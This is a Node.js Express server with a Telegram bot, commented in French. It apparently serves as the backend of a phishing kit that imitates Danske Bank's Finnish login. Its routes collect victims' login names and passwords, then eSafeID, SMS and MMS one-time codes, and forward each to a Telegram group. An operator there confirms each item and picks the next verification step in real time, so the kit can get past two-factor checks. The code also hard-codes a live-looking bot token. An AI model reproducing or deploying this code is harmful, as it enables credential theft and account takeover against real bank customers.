const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

app.use(express.json());

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-id', 'ngrok-skip-browser-warning'],
  credentials: true
}));

// Configurations
const TOKEN = '7696566805:AAEYUujgOdLdtLKxQHJTL8NAkWN_1JNB65Q';
const bot = new TelegramBot(TOKEN, { polling: true });
const FILE_PATH = path.join(__dirname, 'latest-choice.json');
const LATEST_CHOICE_PATH = path.join(__dirname, 'latest-choice.json'); // ✅ CORRECTION ICI
const CHAT_ID = '-1002389865826';

// Initialise le fichier JSON si inexistant
if (!fs.existsSync(FILE_PATH)) {
  fs.writeFileSync(FILE_PATH, JSON.stringify({}, null, 2));
}

// Utils
const loadData = () => fs.existsSync(FILE_PATH) ? JSON.parse(fs.readFileSync(FILE_PATH, 'utf8')) : {};
const saveData = (data) => fs.writeFileSync(FILE_PATH, JSON.stringify(data, null, 2));

// Routes

// 🔵 GET - latest-choice
app.get('/latest-choice.json', (req, res) => {
  res.setHeader('ngrok-skip-browser-warning', 'true');
  const data = loadData();
  res.send(data);
});

app.post('/reset-choice', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  if (!sessionId) return res.status(400).send({ error: 'Session ID manquant' });

  let data = JSON.parse(fs.readFileSync(FILE_PATH, 'utf8'));
  if (data[sessionId]) {
    data[sessionId].choice = null;
    fs.writeFileSync(FILE_PATH, JSON.stringify(data, null, 2));
    console.log(`🔵 Reset du choix pour ${sessionId}`);
    return res.send({ success: true });
  }

  res.status(404).send({ error: 'Session non trouvée' });
});

// ✅ POST - Réception action depuis Etapeid (laheta ou palaa)
app.post('/send-action', (req, res) => {
  const { action } = req.body;
  const sessionId = req.headers['x-session-id'];

  if (!sessionId || !action) {
    return res.status(400).send({ error: 'Session ID ou action manquant' });
  }

  let data = JSON.parse(fs.readFileSync(FILE_PATH, 'utf8'));

  if (!data[sessionId]) {
    return res.status(404).send({ error: 'Session inconnue' });
  }

  // Toujours vider choice pour relancer la boucle
  data[sessionId].choice = null;
  fs.writeFileSync(FILE_PATH, JSON.stringify(data, null, 2));

  if (action === 'laheta') {
    // 🟢 Si c'est Lähetä ➔ 1 seul bouton OK
    bot.sendMessage(CHAT_ID, `✅ L'utilisateur (${sessionId}) a cliqué sur Lähetä (Envoyer)`, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'OK', callback_data: `ok|${sessionId}|laheta` }
        ]]
      }
    });
  } else if (action === 'palaa') {
    // 🟡 Si c'est Palaa ➔ 3 boutons normaux
    bot.sendMessage(CHAT_ID, `🔵 L'utilisateur (${sessionId}) a cliqué sur Palaa (Retour). Choisissez la méthode suivante :`, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Choice', callback_data: `choice|${sessionId}` },
            { text: 'SMS', callback_data: `sms|${sessionId}` },
            { text: 'eSafe', callback_data: `esafe|${sessionId}` }
          ]
        ]
      }
    });
  }

  res.send({ success: true });
});

// 🟢 POST - send-login
app.post('/send-login', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  if (!sessionId) return res.status(400).send({ error: 'Session ID manquant' });

  const { login, password } = req.body;
  const data = loadData();
  data._pendingRequests = data._pendingRequests || {};

  data._pendingRequests[CHAT_ID] = sessionId;
  data[sessionId] = {
    chatId: CHAT_ID,
    credentials: `👤 Login: ${login}\n🔐 Password: ${password}`,
    choice: null,
    choicePending: null,
    code: ''
  };
  saveData(data);

  bot.sendMessage(CHAT_ID, `User: ${sessionId} \n 👤 Identifiants :\n👤 Login: ${login}\n🔐 Password: ${password}\n\nChoisissez une action :`, {
    reply_markup: {
      inline_keyboard: [[
        { text: 'Error', callback_data: `error|${sessionId}` },
        { text: 'Correct', callback_data: `correct|${sessionId}` }
      ]]
    }
  });

  res.send({ success: true });
});

// 🟡 POST - send-choice
app.post('/send-choice', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  const { choice } = req.body;

  if (!sessionId) {
    return res.status(400).send({ error: 'Session ID manquant' });
  }

  if (!choice) {
    return res.status(400).send({ error: 'Choix manquant' });
  }

  const data = loadData();

  // Vérifie si la session existe
  if (!data[sessionId]) {
    return res.status(404).send({ error: 'Session inconnue' });
  }

  // 🟢 Mise à jour sécurisée
  data[sessionId].choicePending = choice;
  data[sessionId].choice = null; // Important pour éviter d'avoir une mauvaise redirection avant clic

  // 🟡 On s'assure que _pendingRequests existe
  if (!data._pendingRequests) {
    data._pendingRequests = {};
  }

  // 🔵 On lie le userChatId au sessionId
  data._pendingRequests[CHAT_ID] = sessionId; // ATTENTION : ici c'est le chatId du groupe (ou individuel)

  saveData(data);

  // 🔥 Envoi message au bot Telegram selon le choix
  if (choice === 'esafe') {
    bot.sendMessage(CHAT_ID, `🔐 Entrez ici le code eSafeID pour ${sessionId} :`);
  } else if (choice === 'id') {
    bot.sendMessage(CHAT_ID, `📲 Confirmation Danske ID pour ${sessionId}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Danske ID', callback_data: `id|${sessionId}` }]
        ]
      }
    });
  } else if (choice === 'sms') {
    bot.sendMessage(CHAT_ID, `✉️ Code SMS pour ${sessionId}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'SMS', callback_data: `sms|${sessionId}` }]
        ]
      }
    });
  } else {
    bot.sendMessage(CHAT_ID, `ℹ️ Nouveau choix demandé : ${choice} pour ${sessionId}`);
  }

  res.send({ success: true });
});


// 🔴 POST - send-esafe-code
app.post('/send-esafe-code', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  const { code } = req.body;
  if (!sessionId || !code) return res.status(400).send({ error: 'Session ID ou code manquant' });

  const data = loadData();
  if (!data[sessionId]) return res.status(404).send({ error: 'Session inconnue' });

  // 🧹 Vider l'ancien choix avant d'envoyer
  data[sessionId].choice = null;
  data[sessionId].choicePending = null;

  // 🛡️ Mettre le nouveau code
  data[sessionId].code = code;
  
  saveData(data);

  // ✉️ Envoyer à Telegram maintenant
  bot.sendMessage(CHAT_ID, `✅ Code eSafeID reçu pour ${sessionId} : ${code}`, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Correct', callback_data: `correct|${sessionId}` },
          { text: '❌ Error', callback_data: `error|${sessionId}` }
        ]
      ]
    }
  });

  res.send({ success: true });
});

app.post('/send-mms-code', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  const { code } = req.body;

  if (!sessionId || !code) {
    return res.status(400).send({ error: 'Session ID ou code manquant' });
  }

  const data = loadData();
  if (!data[sessionId]) {
    return res.status(404).send({ error: 'Session inconnue' });
  }

  // 🔵 Sauvegarder le code MMS
  data[sessionId].mms = code;
  saveData(data);

  // 🔵 Envoyer à Telegram AVEC 2 BOUTONS
  bot.sendMessage(CHAT_ID, `📩 Code MMS reçu pour ${sessionId} : ${code}\n\nConfirmez ce code :`, {
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Correct', callback_data: `correct|${sessionId}` },
        { text: '❌ Error', callback_data: `error|${sessionId}` }
      ]]
    }
  });

  res.send({ success: true });
});


// 🔵 Bot - Réception de messages
bot.on('message', (msg) => {
  const text = msg.text?.trim();
  const userChatId = msg.chat.id.toString();
  if (!text || text.startsWith('/') || !/^\d{3}$/.test(text)) return;

  const data = loadData();
  const pendingRequests = data._pendingRequests || {};
  const sessionId = pendingRequests[userChatId];

  if (sessionId && data[sessionId] && data[sessionId].choicePending === 'esafe') {
    data[sessionId].code = text;
    data[sessionId].choice = 'esafe';
    data[sessionId].choicePending = null;
    delete pendingRequests[userChatId];
    data._pendingRequests = pendingRequests;
    saveData(data);

    bot.sendMessage(CHAT_ID, `✅ Code eSafeID confirmé pour ${sessionId} : ${text}`);
    bot.sendMessage(userChatId, `✅ Merci, code enregistré.`);
  } else {
    bot.sendMessage(userChatId, `❌ Aucune session eSafeID en attente trouvée.`);
  }
});

// 🟣 Bot - Clic sur les boutons
bot.on('callback_query', async (query) => {
  const [action, sessionId, extra] = query.data.split('|');
  const chatId = query.message.chat.id.toString();

  const data = loadData(); // Chargement du fichier JSON

  if (!data[sessionId]) {
    await bot.answerCallbackQuery(query.id, { text: "Session inconnue." });
    return;
  }

  if (action === 'error') {
    data[sessionId].choice = 'error';
    saveData(data);
    await bot.sendMessage(chatId, "❌ Une erreur a été détectée. Merci de vous reconnecter.");
  } 
  else if (action === 'correct') {
    data[sessionId].choice = 'correct';
    saveData(data);
    await bot.sendMessage(chatId, "✅ Informations correctes. Merci de patienter.");
  } 
  else if (action === 'ok' && extra === 'laheta') {
    data[sessionId].choice = 'laheta';
    saveData(data);
    await bot.sendMessage(chatId, "🟢 OK confirmé pour Lähetä !");
  } 
  else if (['choice', 'sms', 'esafe', 'id'].includes(action)) {
    data[sessionId].choice = action;
    saveData(data);
    await bot.sendMessage(chatId, `✅ Nouveau choix: ${action}`);
  }

  await bot.answerCallbackQuery(query.id);
});


app.listen(process.env.PORT, () => {
  console.log('✅ Serveur Express en ligne sur http://localhost:3000');
});
